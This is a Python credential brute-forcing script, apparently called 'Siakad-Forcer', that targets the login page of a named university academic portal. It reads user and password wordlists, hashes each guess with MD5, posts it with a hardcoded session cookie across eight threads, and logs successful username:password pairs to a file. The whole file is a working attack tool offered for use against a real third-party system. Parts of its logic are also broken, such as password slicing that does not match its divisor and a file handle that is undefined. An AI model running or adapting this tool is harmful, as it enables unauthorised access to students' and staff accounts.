import requests
import hashlib
import os,sys,threading

from termcolor import colored, cprint
from proxy_requests import ProxyRequests
from fake_useragent import UserAgent
try:
    import urllib.request as rq
    from urllib.error import HTTPError
    import urllib.parse as http_parser
except ImportError:
    import urllib2 as rq
    from urllib2 import HTTPError
    import urllib as http_parser

class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def getSess_url():
    URL='https://siakad.trunojoyo.ac.id/index.php?pModule=ztSemaQ=&pSub=ztSemaQ=&pAct=0temo5uk'
    phpsessid='MHjznv6R9Li5EZazWnbJw91sZAYNqNSvV-BW_PitKty-VBiZ07M08gGLGaIncNtI'
    return URL,phpsessid

def persiapan(user,passwd):
    URL,phpsessid=getSess_url()
    #phpsessid='CA8JLyJKtcv7srVq53En8jFM-16-nWN2s0OCS_omukJWLBDDO0fHIJoGrd8ry4hz'
    #URL='https://siakad.trunojoyo.ac.id/index.php?pModule=nNXMy9M=&pSub=nNXMy9M=&pAct=ps/K2Q'
    
    passwd=hashlib.md5(passwd).hexdigest()
    post_data = {
                    'username': user,
                    'password': passwd,
                }

    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://siakad.trunojoyo.ac.id/',
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Cookie': 'PHPSESSID='+ phpsessid
    }
    #print (username,passwd,URL,phpsessid)
    return URL,post_data,header

def brute(username,password):
    URL,post_data,header=persiapan(username,password)
    try:
        hasil= requests.post(URL,post_data,headers=header)
        try:
            if hasil.content.index(username):
                cprint('Passwd :{} - Sukses Login ke siakad'.format(password,'yellow'))
                fr.write(username+':'+password)
                #return (True)
        except:
            #cprint('Mencoba passwd : {}'.format(password,'green'))
            pass
    except:
        pass

def mulai(username,password):
    global forbreak
    for x in password:
        h=brute(username,x)
        if h==True:
            forbreak=True
            break
    
def readpass():
    fr=open('pass.txt','r')
    freaded=fr.read().splitlines()
    return freaded

def readuser():
    fr=open('user.txt','r')
    freaded=fr.read().splitlines()
    return freaded

if __name__ == "__main__":
    cprint('''  _____ _       _             _       ______                      
 /  ___(_)     | |           | |      |  ___|                     
 \ `--. _  __ _| | ____ _  __| |______| |_ ___  _ __ ___ ___ _ __ 
  `--. \ |/ _` | |/ / _` |/ _` |______|  _/ _ \| '__/ __/ _ \ '__|
 /\__/ / | (_| |   < (_| | (_| |      | || (_) | | | (_|  __/ |   
 \____/|_|\__,_|_|\_\__,_|\__,_|      \_| \___/|_|  \___\___|_|   
                                                                  
                                                                  ''','green')
    print('''Author : none_knows
Version : 0.1b''')
                                                                                                                     


    fr=open('output.txt','a')
    user=readuser()
    password=readpass()

    
    cprint ('===============================================','red')
    cprint ('===============================================','red')
    forbreak=False
    threads = []
    a=len(password)
    pem=a/4
    a1=(pem*1)
    a2=(pem*2)
    a3=(pem*3)
    a4=(pem*4)
    a5=(pem*5)
    a6=(pem*6)
    a7=(pem*7)
    a8=(pem*8)
    
    for username in user:
        cprint('\nBrute Force Akun siakad : {}'.format(username),'blue')
        cprint('===============================================','blue')
        t = threading.Thread(target=mulai, args=(username,password[:a1],))
        t.start()
        threads.append(t)

        t1 = threading.Thread(target=mulai, args=(username,password[a1:a2],))
        t1.start()
        threads.append(t1)

        t2 = threading.Thread(target=mulai, args=(username,password[a2:a3],))
        t2.start()
        threads.append(t2)

        t3 = threading.Thread(target=mulai, args=(username,password[a3:a4],))
        t3.start()
        threads.append(t3)

        t4 = threading.Thread(target=mulai, args=(username,password[a4:a5],))
        t4.start()
        threads.append(t4)

        t5 = threading.Thread(target=mulai, args=(username,password[a5:a6],))
        t5.start()
        threads.append(t5)

        t6 = threading.Thread(target=mulai, args=(username,password[a6:a7],))
        t6.start()
        threads.append(t6)

        t7 = threading.Thread(target=mulai, args=(username,password[a7:],))
        t7.start()
        threads.append(t7)

        for t in threads:
            t.join()
    fr.close()
    
    
